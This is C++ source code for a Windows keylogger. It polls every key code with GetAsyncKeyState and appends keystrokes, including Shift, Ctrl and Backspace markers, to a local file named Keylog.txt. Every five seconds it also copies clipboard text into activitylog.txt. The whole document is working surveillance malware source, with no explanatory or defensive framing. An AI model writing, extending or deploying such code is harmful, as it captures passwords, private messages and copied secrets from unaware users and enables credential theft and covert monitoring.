#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

// Function to log key presses to a file
void logKey(int key, const char* fileName)
{
    ofstream logFile;
    logFile.open(fileName, ios::app);

    if((key >= 39) && (key <= 64))
    {
        logFile << char(key);
    }
    else if ((key > 64) && (key < 91))
    {
        logFile << char(key + 32); // convert to lower case;
    }
    else 
    {
        switch (key)
        {
        case VK_SPACE:
            logFile << " ";
            break;
        case VK_RETURN:
            logFile << "\n";
            break;
        case VK_SHIFT:
            logFile << "[SHIFT]";
            break;
        case VK_BACK:
            logFile << "[BACKSPACE]";
            break;
        case VK_TAB:
            logFile << "[TAB]";
            break;
        case VK_CONTROL:
            logFile << "[CTRL]";
            break;
        case VK_ESCAPE:
            logFile << "[ESC]";
            break;
        case VK_DELETE:
            logFile << "[DEL]";
            break;
        default:
            logFile << "[" << key << "]";
        }
    }
    logFile.close();
}

// Function to log clipboard content to a file
void logClipboard(const char* fileName)
{
    if(OpenClipboard(nullptr))
    {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if(hData != nullptr)
        {
            char* pszText = static_cast<char*>(GlobalLock(hData));
            if(pszText != nullptr)
            {
                std::ofstream logFile;
                logFile.open(fileName, std::ios::app);
                logFile << "[CLIPBOARD]: " << pszText << "\n";
                logFile.close();
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    }
}

int main()
{
    const char* keylogFile = "Keylog.txt";
    const char* clipboardFile = "activitylog.txt";

    static DWORD lastClipboardCheck = 0;

    while(true)
    {
        // Sleep to reduce CPU usage
        Sleep(10);

        // Keylogger functionality
        for(int key = 8; key <= 255; key++)
        {
            if(GetAsyncKeyState(key) & 0x0001)
            {
                logKey(key, keylogFile);
            }
        }

        // Clipboard logging every 5 seconds (5000 ms)
        if(GetTickCount() - lastClipboardCheck > 5000)
        {
            logClipboard(clipboardFile);
            lastClipboardCheck = GetTickCount();
        }
    }

    return 0;
}
